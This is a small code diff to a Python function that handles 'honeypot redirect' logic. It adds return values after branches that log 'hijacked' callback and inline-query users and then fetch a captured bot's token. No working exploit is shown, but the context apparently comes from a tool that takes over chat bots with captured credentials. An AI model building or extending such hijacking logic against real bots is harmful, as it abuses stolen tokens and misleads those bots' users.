@@ -4045,6 +4045,7 @@ async def _honeypot_redirect_one_logic(
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
         logger.info(f"🔀 [Callback] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
+        return {"status": "callback_handled", "sent": sent_ok, "user_id": user_id}
     
     # Level 4: Inline query hijack
     elif update_type == "inline_query":
@@ -4076,6 +4077,7 @@ async def _honeypot_redirect_one_logic(
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         
         logger.info(f"🔀 [Inline] hijacked user:{user_id} cred:{credential_id[:8]}... sent={sent_ok}")
+        return {"status": "inline_handled", "sent": sent_ok, "user_id": user_id}
 
     # Get the captured bot's token
     try:
